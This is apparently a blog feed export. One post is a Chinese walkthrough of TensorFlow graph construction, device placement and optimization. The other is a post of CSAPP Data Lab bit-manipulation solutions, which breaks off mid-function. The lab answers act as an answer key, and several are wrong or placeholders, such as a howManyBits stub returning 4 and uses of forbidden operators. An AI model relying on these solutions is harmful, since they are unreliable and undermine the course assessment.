<p>然后将GraphDef实例转化为tensorflow::Graph实例，这个过程由tensorflow::GraphConstructor类完成。GraphConstructor先判别node的字符串格式是否正确，然后执行convert函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GraphConstructor::Convert()</span><br><span class="line">[graph/graph_constructor.cc]</span><br></pre></td></tr></table></figure>
<p>首先，按拓扑图的顺序逐步添加node和edge到graph中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Graph:: AddNode(<span class="keyword">const</span> NodeDef&amp; node_def, Status* status)</span><br><span class="line">Graph:: AddEdge(Node* source, <span class="keyword">int</span> x, Node* dest, <span class="keyword">int</span> y)</span><br><span class="line">                             [graph/graph.cc]</span><br></pre></td></tr></table></figure>
<p>然后，找出所有起始点（source node）和终止点（sink node）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FixupSourceAndSinkEdges(Graph* g)</span><br><span class="line">            [graph/algorithms.cc]</span><br></pre></td></tr></table></figure>
<p>接着，对graph进行优化。图优化部分请参考章节6.5。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OptimizeCSE(Graph* g, <span class="built_in">std</span>::function&lt;<span class="keyword">bool</span>(<span class="keyword">const</span> Node*)&gt; consider_fn);</span><br><span class="line">                 [graph/optimizer_cse.cc]</span><br></pre></td></tr></table></figure>
<p>TF的graph构建模块测试用例在<code>core/graph/graph_constructor_test.cc</code>文件中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bazel build -c dbg //tensorflow/core/graph_graph_constor_test</span><br><span class="line">$ gdb bazel-bin/tensorflow/core/graph_graph_constructor_test</span><br></pre></td></tr></table></figure>
<p>##5.3 Graph局部执行</p>
<p>Graph的局部执行特性允许使用者从任意一个节点输入（feed），并指定目标输出节点（fetch）。图 5 6是TF白皮书中描述Graph局部执行的图。[15]</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148918604764.jpg" alt=""></p>
<p>图 5-6中左侧为计算图，如果要实现<code>f=F(c)</code>运算，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result=sess.run(f, feed_dict=&#123;c:input&#125;)</span><br></pre></td></tr></table></figure>
<p>TF是如何知道两个点之间的计算路径呢？这里涉及传递闭包的概念。传递闭包就是根据graph中节点集合和有向边的集合，找出从节点A到节点B的最小传递关系。如上图中，点a到点f的传递闭包是a -&gt; c -&gt; f。</p>
<p>Graph局部执行过程就是找到feed和fetch的最小传递闭包，这个传递闭包相当于原graph的subgraph。代码文件在graph/<a href="http://link.zhihu.com/?target=http%3A//subgraph.cc">http://subgraph.cc</a>中，函数RewriteGraphForExecution()在确定feed节点和fetch节点后，通过剪枝得到最小传递子图。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PruneForTargets(g, name_index, fetch_nodes, target_node_names));</span><br><span class="line">                [graph/subgraph.cc]</span><br></pre></td></tr></table></figure>
<p>剪枝操作的实现函数如下，Graph通过模拟计算流标记出节点是否被访问，剔除未被访问的节点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PruneForReverseReachability(Graph* g, std::unordered_set&lt;const Node*&gt; visited)</span><br><span class="line">[graph/algorithm.cc]</span><br></pre></td></tr></table></figure>
<p>##5.4 Graph设备分配</p>
<p>TF具有高度设备兼容性，支持X86和Arm架构，支持CPU、GPU运算，可运行于Linux、MacOS、Android和IOS系统。而且，TF的设备无关性特征在多设备分布式运行上也非常有用。</p>
<p>Graph中每个节点都分配有设备编号，表示该节点在相应设备上完成计算操作。用户既可以手动指定节点设备，也可以利用TF自动分配算法完成节点设备分配。设备自动算法需要权衡数据传输代价和计算设备的平衡，尽可能充分利用计算设备，减少数据传输代价，从而提高计算性能。</p>
<p>Graph设备分配用于管理多设备分布式运行时，哪些节点运行在哪个设备上。TF设备分配算法有两种实现算法，第一种是简单布放算法（Simple Placer），第二种基于代价模型（Cost Model）评估。简单布放算法按照指定规则布放，比较简单粗放，是早期版本的TF使用的模型，并逐步被代价模型方法代替。</p>
<p>###5.4.1 Simple Placer算法</p>
<p>TF实现的Simple Placer设备分配算法使用union-find方法和启发式方法将部分不相交且待分配设备的Op节点集合合并，并分配到合适的设备上。</p>
<p>Union-find（联合-查找）算法是并查集数据结构一种应用。并查集是一种树型的数据结构，其保持着用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。Union-find定义了两种基本操作：Union和Find。</p>
<ul>
<li><p>Find：确定元素属于哪一个子集。它可以被用来确定两个元素是否属于同一子集。</p>
</li>
<li><p>Union：将两个子集合并成同一个集合。即将一个集合的根节点的父指针指向另一个集合的根节点。</p>
</li>
</ul>
<p>启发式算法（Heuristic Algorithm）定义了节点分配的基本规则。Simple Placer算法默认将起始点和终止点分配给CPU，其他节点中GPU的分配优先级高于CPU，且默认分配给GPU:0。启发式规则适用于以下两种场景：</p>
<ul>
<li>对于符合GeneratorNode条件（0-indegree, 1-outdegree, not ref-type）的节点，让node与target_node所在device一致，参见图 5 7。</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148907334988.jpg" alt=""></p>
<ul>
<li>对于符合MetaDataNode条件（即直接在原数据上的操作，如reshape）的节点，让node与source_node所在device一致，参见图 5 8。</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148907386738.jpg" alt=""></p>
<p>TF中Simple Placer的实现定义在文件<code>core/common_runtime/simple_placer.cc</code>。文件中主要定义了两个类：ColocationGraph和SimplePlacer。ColocationGraph类利用Union-find算法将节点子集合合并成一个节点集合，参考成员函数ColocationGraph:: ColocateNodes实现。SimplePlacer类实现节点分配过程，下面将主要介绍SimplePlacer:: Run()函数的实现过程。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimplePlacer::Run()</span><br></pre></td></tr></table></figure>
<p><strong>首先，</strong>将graph中的node加入到ColocationGraph实例中，不包含起始点和终止点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ColocationGraph colocation_graph(graph_, devices_, options_);</span><br><span class="line">colocation_graph.AddNode(*node);[for node in _graph]</span><br></pre></td></tr></table></figure>
<p><strong>然后，</strong>找出graph中受constraint的edge(即src_node被指定了device的edge)，强制将dst_node指定到src_node所在的device。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">colocation_graph.ColocateNodes(*edge-&gt;src(), *node);</span><br></pre></td></tr></table></figure>
<p><strong>最后，</strong>根据graph中已有的constraint条件为每个no-constraint的node指定device。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if IsGeneratorNode(node) AssignAndLog(assigned_device, node);</span><br><span class="line">if IsMetadataNode(node) AssignAndLog(assigned_device, node);</span><br></pre></td></tr></table></figure>
<p>Simple Placer的测试用例core/common_runtime/simple_placer_test.cc)文件，要调试这个测试用例，可通过如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bazel buid -c dbg //tensorflow/core:common_runtime_simple_placer_test</span><br><span class="line">$ gdb bazel-bin/tensorflow/core/common_runtime_simple_placer_test</span><br></pre></td></tr></table></figure>
<p>###5.4.2 代价模型</p>
<p>TF使用代价模型（Cost Model）会在计算流图生成的时候模拟每个device上的负载，并利用启发式策略估计device上的完成时间，最终找出预估时间最低的graph设备分配方案。[1]</p>
<p>Cost model预估时间的方法有两种：</p>
<p>Ø 使用启发式的算法，通过把输入和输出的类型以及tensor的大小输入进去，得到时间的预估</p>
<p>Ø 使用模拟的方法，对图的计算进行一个模拟，得到各个计算在其可用的设备上的时间。</p>
<p>启发式策略会根据如下数据调整device的分配：节点任务执行的总时间；单个节点任务执行的累计时间；单个节点输出数据的尺寸。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148910522852.jpg" alt=""></p>
<p>TF中代价模型的实现定义在文件core/graph/<a href="http://link.zhihu.com/?target=http%3A//costmodel.cc">http://costmodel.cc</a>和core/common_runtime/ <a href="http://link.zhihu.com/?target=http%3A//costmodel_manager.cc">http://costmodel_manager.cc</a>，其UML视图参见图 5 9。</p>
<p>Cost model manager从graph创建cost model，再评估计算时间，如下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Void ConstModel:: InitFromGraph(<span class="keyword">const</span> Graph&amp; g)&#123;</span><br><span class="line">    AddNodesToCostModel(g, <span class="keyword">this</span>);</span><br><span class="line">    AssignSizes(g, <span class="keyword">this</span>);</span><br><span class="line">    EstimateComputationCosts(g, <span class="keyword">this</span>);</span><br><span class="line">    CheckInitialized(g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中评估时间的函数EstimateComputationCosts是对graph中每个node依次评估，节点计算时间评估函数如下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TimeEstimateForNode(CostModel* cost_model, Node* n)</span><br></pre></td></tr></table></figure>
<p>##5.5 Graph优化</p>
<p>Graph优化算法利用一些优化策略，降低graph的计算复杂度和空间复杂度，提高graph运行速度。</p>
<p>Graph优化算法的实现在文件<code>core/common_runtime/graph_optimizer.cc</code>)。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GraphOptimizer::Optimize(FunctionLibraryRuntime* runtime,</span><br><span class="line">                Device* device, Graph** graph)</span><br></pre></td></tr></table></figure>
<p>Graph优化策略有三种：</p>
<h3 id="Common-Subexpression-Elimination-CSE-公共子表达式消除"><a href="#Common-Subexpression-Elimination-CSE-公共子表达式消除" class="headerlink" title="Common Subexpression Elimination (CSE, 公共子表达式消除)"></a>Common Subexpression Elimination (CSE, 公共子表达式消除)</h3><p>如果一个表达式E已经计算过了，并且从先前的计算到现在的E中的变量都没有发生变化，那么E的此次出现就成为了公共子表达式。例如：x=(a+c)<em>12+(c+a)</em>2; 可优化为 x=E*14。</p>
<p>CSE实现函数如下，具体细节参考文献[16]。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OptimizeCSE(Graph* g, <span class="built_in">std</span>:: function&lt;<span class="keyword">bool</span>(<span class="keyword">const</span> Node*)&gt;</span><br><span class="line">                            consider_fn);</span><br><span class="line">                    [graph/optimizer_cse.cc]</span><br></pre></td></tr></table></figure>
<p>CSE测试用例在文件graph/<a href="http://link.zhihu.com/?target=http%3A//optimizer_cse_test.cc">http://optimizer_cse_test.cc</a>中，调试方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bazel build -c dbg //tensorflow/core:graph_optimizer_cse_test</span><br><span class="line">$ gdb bazel-bin/tensorflow/core/graph_optimizer_cse_test</span><br></pre></td></tr></table></figure>
<h3 id="Constant-Folding-常量合并"><a href="#Constant-Folding-常量合并" class="headerlink" title="Constant Folding (常量合并)"></a>Constant Folding (常量合并)</h3><p>在编译优化时，变量如果能够直接计算出结果，那么变量将有常量直接替换。例如：a=3+1-3*1; 可优化为a=1。</p>
<p>常量合并的实现函数如下。</p>
<p><img src="media/v2-2c9db44dbcc589a3303d1adb97b49b10_hd.jpg" alt=""></p>
<p>常量合并的测试用例在<code>common_runtime/constant_folding_test.cc</code>)中，调试方法：</p>
<p><img src="media/v2-11d9cd09d86e21949ae7f253a96390b3_hd.jpg" alt=""></p>
<h3 id="Function-Inlining-函数内联"><a href="#Function-Inlining-函数内联" class="headerlink" title="Function Inlining (函数内联)"></a>Function Inlining (函数内联)</h3><p>函数内联处理可减少方法调用的成本。在TF中包含以下几种方法：</p>
<ul>
<li><p>RemoveListArrayConverter(g)：” Rewrites _ListToArray and _ArrayToList to a set of Identity nodes”.</p>
</li>
<li><p>RemoveDeadNodes(g)：删除DeatNode。DeatNode的特征是”not statefull, not _Arg, not reachable from _Retval”.</p>
</li>
<li><p>RemoveIdentityNodes(g)：删除Identity节点。如n2=Identity(n1) + Identity(n1); 优化后: n2=n1 + n1;</p>
</li>
<li><p>FixupSourceAndSinkEdges(g)：固定source和sink的边</p>
</li>
<li><p>ExpandInlineFunctions(runtime, g)：展开内联函数的嵌套调用</p>
</li>
</ul>
<p>其中<code>_ListToArray</code>、<code>_ArrayToList</code>、<code>_Arg</code>、<code>_Retval</code>均在<code>core/ops/function_ops.cc</code>)中定义。</p>
<p>Graph优化相关测试文件在<code>common_runtime/function_test.cc</code>)，调试方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bazel build -c dbg //tensorflow/core:common_runtime_function_test</span><br><span class="line">$ gdb bazel-bin /tensorflow/core/common_runtime_function_test</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Lab1 Data Lab]]></title>
      <url>/wiki/2017/12/30/CSAPP-Lab-Data-Lab/</url>
      <content type="html"><![CDATA[<h4 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h4><p>bitXor - x^y using only ~ and &amp; </p>
<ul>
<li>Example: bitXor(4, 5) = 1</li>
<li>Legal ops: ~ &amp;</li>
<li>Max ops: 14</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x&amp;y)&amp;(~((~x)&amp;(~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>allOddBits - return 1 if all odd-numbered bits in word set to 1</p>
<ul>
<li>Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v = <span class="number">0xAA</span>;</span><br><span class="line">  v = v | (v &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  v = v | (v &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !(((x &amp; v) | (~v)) +<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)</p>
<ul>
<li>Example: isAsciiDigit(0x35) = 1. isAsciiDigit(0x3a) = 0. isAsciiDigit(0x05) = 0.</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 15</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span>  (!(~(x &gt;&gt; <span class="number">8</span>)+<span class="number">1</span>))&amp;(!((x<span class="number">-0x30</span>)&gt;&gt;<span class="number">31</span>))&amp;(!(((x<span class="number">-0x3a</span>)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>conditional - same as x ? y : z </p>
<ul>
<li>Example: conditional(2,4,5) = 4</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 16</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// repeat</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *if x!=0,mask=0x00000000, y&amp;~mask=y and z&amp;mask=0</span></span><br><span class="line"><span class="comment">     *if x==0,mask=0xffffffff, y&amp;~mask = y&amp;0 =0; z&amp;mask=z</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">int</span> mask= ~!x+<span class="number">1</span>; </span><br><span class="line">  <span class="keyword">return</span> (y &amp; ~mask)|(z &amp; mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>logicalNeg - implement the ! operator, using all of the legal operators except !</p>
<ul>
<li>Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</li>
<li>Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(~(x<span class="number">-1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="补码运算"><a href="#补码运算" class="headerlink" title="补码运算"></a>补码运算</h4><p>tmin - return minimum two’s complement integer </p>
<ul>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 4</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>isTmax - returns 1 if x is the maximum, two’s complement number, and 0 otherwise </p>
<ul>
<li>Legal ops: ! ~ &amp; ^ | +</li>
<li>Max ops: 10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x) ^ (x + <span class="number">1</span>)) &amp; !!(~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>negate - return -x </p>
<ul>
<li>Example: negate(1) = -1.</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 5</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>isLessOrEqual - if x &lt;= y  then return 1, else return 0 </p>
<ul>
<li>Example: isLessOrEqual(4,5) = 1.</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 24</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!(((x-y)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>)) || (!(x-y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>howManyBits - return the minimum number of bits required to represent x in two’s complement</p>
<ul>
<li>Examples: howManyBits(12) = 5, howManyBits(298) = 10, howManyBits(-5) = 4, howManyBits(0)  = 1, howManyBits(-1) = 1, howManyBits(0x80000000) = 32</li>
<li>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>Max ops: 90</li>
<li>Rating: 4</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h4><p>float_twice - Return bit-level equivalent of expression 2*f for<br>floating point argument f.</p>
<ul>
<li>Both the argument and result are passed as unsigned int’s, but they are to be interpreted as the bit-level representation of single-precision floating point values.</li>
<li>When argument is NaN, return argument</li>
<li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br>Max ops: 30</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &amp; <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="built_in">exp</span> = uf &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf &amp; <span class="number">0x007FFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0x7F800000</span>) <span class="comment">// when argument is NaN, return argument</span></span><br><span class="line">      <span class="keyword">return</span> uf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x0</span>) <span class="comment">// 无规格化的情况</span></span><br><span class="line">      <span class="keyword">return</span> sign | (frac &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x7f000000</span>)<span class="comment">// 会变成无穷大</span></span><br><span class="line">      frac = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sign|(<span class="built_in">exp</span>+<span class="number">0x800000</span>)|frac;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>float_i2f - Return bit-level equivalent of expression (float) x<br>Result is returned as unsigned int, but</p>
<ul>
<li>it is to be interpreted as the bit-level representation of a single-precision floating point values.</li>
<li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</li>
<li>Max ops: 30</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Rounding is important!  </span></span><br><span class="line">    <span class="keyword">unsigned</span> sign=<span class="number">0</span>,shiftleft=<span class="number">0</span>,flag=<span class="number">0</span>,tmp;  </span><br><span class="line">    <span class="keyword">unsigned</span> absx=x;  </span><br><span class="line">    <span class="keyword">if</span>( x==<span class="number">0</span> ) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span>( x&lt;<span class="number">0</span> )&#123;  </span><br><span class="line">     sign=<span class="number">0x80000000</span>;  </span><br><span class="line">     absx=-x;  </span><br><span class="line">   &#125;  </span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;<span class="comment">//Shift until the highest bit equal to 1 in order to normalize the floating-point number  </span></span><br><span class="line">   tmp=absx;  </span><br><span class="line">   absx&lt;&lt;=<span class="number">1</span>;  </span><br><span class="line">   shiftleft++;  </span><br><span class="line">   <span class="keyword">if</span>( tmp&amp;<span class="number">0x80000000</span> ) <span class="keyword">break</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="comment">//round to even</span></span><br><span class="line">  <span class="keyword">if</span>( (absx &amp; <span class="number">0x01ff</span>) &gt; <span class="number">0x0100</span> ) flag=<span class="number">1</span>;<span class="comment">//向上舍入</span></span><br><span class="line">  <span class="keyword">if</span>( (absx &amp; <span class="number">0x03ff</span>) == <span class="number">0x0300</span> ) flag=<span class="number">1</span>;<span class="comment">//中间值，向偶数舍入</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sign+(absx&gt;&gt;<span class="number">9</span>)+((<span class="number">159</span>-shiftleft)&lt;&lt;<span class="number">23</span>)+flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>float_f2i - Return bit-level equivalent of expression (int) f<br>for floating point argument f.</p>
<ul>
<li>Argument is passed as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point value.</li>
<li>Anything out of range (including NaN and infinity) should return 0x80000000u.</li>
<li>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</li>
<li>Max ops: 30</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">float_f2i</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = (uf&gt;&gt;<span class="number">31</span>)==<span class="number">0</span> ? <span class="number">1</span>: <span class="number">-1</span>; <span class="comment">//最高位</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span>  = uf&amp;<span class="number">0x7f800000</span>;  <span class="comment">//中间8位</span></span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf&amp;<span class="number">0x007FFFFF</span>; <span class="comment">//最低23位</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//特殊情况NaN, inf</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span>==<span class="number">0x7f800000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//特殊情况：0</span></span><br><span class="line">  <span class="keyword">if</span> (uf==<span class="number">0x800000</span>)</span><br><span 